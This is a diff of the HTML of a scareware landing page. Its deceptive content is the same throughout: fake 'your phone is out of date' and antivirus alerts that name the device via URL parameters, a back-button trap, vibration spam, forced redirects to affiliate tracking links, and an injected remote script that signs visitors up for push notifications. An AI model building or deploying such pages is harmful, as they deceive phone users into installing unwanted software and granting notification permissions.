@@ -5,6 +5,34 @@
   <meta name="google" value="notranslate">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <style type="text/css">html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}article,aside,details,figcaption,figure,footer,header,hgroup,main,menu,nav,section,summary{display:block}audio,canvas,progress,video{display:inline-block;vertical-align:baseline}audio:not([controls]){display:none;height:0}[hidden],template{display:none}a{background-color:transparent}a:active,a:hover{outline:0}abbr[title]{border-bottom:1px dotted}b,strong{font-weight:700}dfn{font-style:italic}h1{font-size:2em;margin:.67em 0}mark{background:#ff0;color:#000}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sup{top:-.5em}sub{bottom:-.25em}img{border:0}svg:not(:root){overflow:hidden}figure{margin:1em 40px}hr{-moz-box-sizing:content-box;box-sizing:content-box;height:0}pre{overflow:auto}code,kbd,pre,samp{font-family:monospace,monospace;font-size:1em}button,input,optgroup,select,textarea{color:inherit;font:inherit;margin:0}button{overflow:visible}button,select{text-transform:none}button,html input[type=button],input[type=reset],input[type=submit]{-webkit-appearance:button;cursor:pointer}button[disabled],html input[disabled]{cursor:default}button::-moz-focus-inner,input::-moz-focus-inner{border:0;padding:0}input{line-height:normal}input[type=checkbox],input[type=radio]{box-sizing:border-box;padding:0}input[type=number]::-webkit-inner-spin-button,input[type=number]::-webkit-outer-spin-button{height:auto}input[type=search]{-webkit-appearance:textfield;-moz-box-sizing:content-box;-webkit-box-sizing:content-box;box-sizing:content-box}input[type=search]::-webkit-search-cancel-button,input[type=search]::-webkit-search-decoration{-webkit-appearance:none}fieldset{border:1px solid silver;margin:0 2px;padding:.35em .625em .75em}legend{border:0;padding:0}textarea{overflow:auto}optgroup{font-weight:700}table{border-collapse:collapse;border-spacing:0}td,th{padding:0}</style>
+
+  <script>
+    function contains(string, fragment) {
+      string = string.toLowerCase();
+      fragment = fragment.toLowerCase();
+      return string.indexOf(fragment) !== -1;
+    }
+  
+    function getURLParameter(name) {
+      var result = decodeURI((RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || '');
+      if(name.indexOf('brand') !== -1 && contains(result, 'generic')) {
+        result = 'Phone'
+      }
+      if(name.indexOf('model') !== -1 && contains(result, 'android')) {
+        result = 'Phone'
+      }
+      if(name.indexOf('browser') !== -1 && contains(result, 'android')) {
+        result = 'Internet Browser'
+      }
+  
+      if(result==null||result==""){
+              result = 'Phone'
+          }
+  
+      return result;
+    }
+    </script>
+
 <style>
     html, body, p, h1, h2, h3, h4, h5, em, i, table, tr, td, th, form, input, textarea, select, li, ol, ul, strong {padding:0;margin:0;}
     html {font-size:62.5%;}
@@ -107,139 +135,101 @@
   
 </head>
 <body class="en ltr">
-
-  
-
-
-        
-        
-  
-  
-
-  
-        <!--
-      array(1) {
-  [0]=>
-  string(31) "Application update is available"
-}
-      array(3) {
-  [0]=>
-  string(43) "Software on your phone may be out of date."
-  [1]=>
-  string(107) "Installing the new Phone Cleaner Pro update will update your IOS version"
-  [2]=>
-  string(100) "Click the button below to install new Phone Cleaner Pro from App Atore for FREE."
-}
-      -->
   
 <audio autoplay="autoplay" preload="">
     <source src="./default.mp3" type="audio/mpeg">
     <source src="./default.ogg" type="audio/ogg">
 </audio>
-  
-<script type="text/javascript">(function(nv) { 
-  if (nv.userAgent.toLowerCase().indexOf('firefox') === -1) {
-    nv.vibrate = nv.vibrate || nv.webkitVibrate || nv.mozVibrate || nv.msVibrate; nv.vibrate([11000, 11500, 11000, 11500, 11000, 111500, 111000, 11500, 11000]); 
-  }
-  })(navigator);</script>
-
-      
-
-                                                      
-<script type="text/javascript">
-
-  navigator.vibrate = navigator.vibrate || navigator.webkitVibrate || navigator.mozVibrate || navigator.msVibrate;
-  window.onload = function(){ navigator.vibrate([11500, 11100, 111500, 11100]); }
-    
-  var fakepath="";
-  
-  window.history.pushState('index.php', 'gogogo', fakepath);
-  window.history.pushState('index.php', 'disone', fakepath);
-
-  window.addEventListener("popstate", function(e){if(document.URL.indexOf(fakepath) >= 0){
-    window.history.pushState('index.php', 'gogogo', fakepath);
-    window.history.pushState('index.php', 'disone', fakepath);
-    if (document.getElementById('snd')) {
-      document.getElementById('snd').play();navigator.vibrate([1500]);
-    }
-    alert('Update is strongly recommended!\n\nPlease update or IOS may become slow and your phone may be damaged!');
-  }});
-
-</script>
-        
-  
-        
 
 <div id="all" class="en">
 
-<div class="logo_col"><a rel="noreferrer noopener" href="https://data-tracking.net/click.php?lp=1"><img src="./icon.png" alt=""></a></div>
+<div class="logo_col"><a rel="noreferrer noopener" onclick="ctaclick()" href="https://tk.besttrustedreview.com/click.php?lp=1&to_offer=2"><img src="./icon.png" alt=""></a></div>
 
   <div class="text_wrap">
     <div class="text_content">
 
-      <p class="text">
-      
-                  Application update is available</p>
-
-      
-                  <p class="text">Software on your <script>document.write(getURLParameter("brand"))</script> <script>document.write(getURLParameter("model"))</script> may be out of date.</p>
-                  <p class="text">Installing the new Phone Cleaner Pro update will update your IOS version</p>
-                  <p class="text">Click the button below to install new Phone Cleaner Pro from App Store for FREE.</p>
+      <p class="text"><b>Please Upgrade Now, Upgrade Now!</b></p>
+      <p class="text">Security system on your <script>document.write(getURLParameter("device_brand"))</script> is out of date.</p>
+      <p class="text">Upgrade your security system now to make your phone safer, faster and with a longer lasting battery</p>
+      <p class="text">Click the button below to install security system from Google Play for FREE.</p>
               
     </div>
 
           <div class="button">
     
-      <a rel="noreferrer noopener" href="https://data-tracking.net/click.php?lp=1">
-              DOWNLOAD      
+      <a rel="noreferrer noopener" onclick="ctaclick()" href="https://tk.besttrustedreview.com/click.php?lp=1&to_offer=2">
+              UPDATE      
     </a></div>
   </div>
 
 </div>
 
- 
-                  
-    <script type="text/javascript">
-         (function(w, d) {
-             function getCookie(name) {
-                 var matches = document.cookie.match(new RegExp(
-                         "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
-                 ));
-                 return matches ? decodeURIComponent(matches[1]) : false;
-             }
-
-             function setCookie(name, value) {
-                 // for 30 minutes
-                 var date = new Date(new Date().getTime() + 60 * 30 * 1000);
-                 document.cookie = name + "=" + value + "; expires=" + date.toUTCString();
-             }
-
-            var ow = w.onload;
-            w.onload = function() {
-                setTimeout(function() {
-                    var hrf = "https://data-tracking.net/click.php?lp=1";
-
-                    if(!getCookie('hidePrepop')) {
-                    
-                                                  setCookie('hidePrepop', 1);
-                                               
-                        alert("Application update is available! \n\nSoftware on your phone may be out of date.\nClick OK and install new Phone Cleaner Pro from App Store for FREE.");
-                        var prepopEvent = new Event('prepopFired');
-                        document.dispatchEvent(prepopEvent);
-                    }
-
-                                        if (typeof ow === "function") {
-                        ow();
-                    }
-                    }, 10);
-            }
-        })(window, document);
-    </script>
-
-  <div style="display:none;"><a href="https://data-tracking.net/click.php?lp=1">Go to site</a></div>
+<script>
+  function ctaclick(){
+    window.onbeforeunload = null;
+    window.open("https://tk.besttrustedreview.com/click.php?lp=1&to_offer=1", "_blank");
     
-
-
+    setInterval(afflowsmartlink, 1000);
+  }
+  
+  function afflowsmartlink(){
+    location.replace("https://tk.besttrustedreview.com/click.php?lp=1&to_offer=2");
+  }
+  
+</script>
 	
+<script type="text/javascript">
+  (function(w, d) {
+      function getCookie(name) {
+          var matches = document.cookie.match(new RegExp(
+                  "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
+          ));
+          return matches ? decodeURIComponent(matches[1]) : false;
+      }
+
+      function setCookie(name, value) {
+          // for 30 minutes
+          var date = new Date(new Date().getTime() + 60 * 30 * 1000);
+          document.cookie = name + "=" + value + "; expires=" + date.toUTCString();
+      }
+
+     var ow = w.onload;
+     w.onload = function() {
+         setTimeout(function() {
+             var href = "https://tk.besttrustedreview.com/click.php?lp=1&to_offer=1";
+
+            if(!getCookie('hidePrepop')) {
+             
+                 setCookie('hidePrepop', 1);
+                                        
+                 alert("Antivirus System Must Be Updated NOW! \n\nAntivirus System On Your Phone is Out Of Date.\n\nDon't Put Yourself At Risk.\n\nClick OK and Update from Google Play for FREE.");
+                 var prepopEvent = new Event('prepopFired');
+                 document.dispatchEvent(prepopEvent);
+             }
+
+            if (typeof ow === "function") {
+                 ow();
+             }
+             }, 10);
+     }
+ })(window, document);
+</script>
+
+<script>
+  var url = new URL(window.location.href);
+  var pci = url.searchParams.get('clickid');
+  var s = document.createElement('script');
+  s.src='//bigrourg.net/pfe/current/micro.tag.min.js?z=4978561'+'&ymid='+pci+'&sw=/sw-check-permissions-3b3e2.js';
+  s.onload = function(result) {
+      switch (result) {
+          case 'onPermissionDefault':break;
+          case 'onPermissionAllowed':break;
+          case 'onPermissionDenied':break;
+          case 'onAlreadySubscribed':break;
+          case 'onNotificationUnsupported':break;
+      }
+  }
+  document.head.appendChild(s);
+</script>
 	
 </body></html>
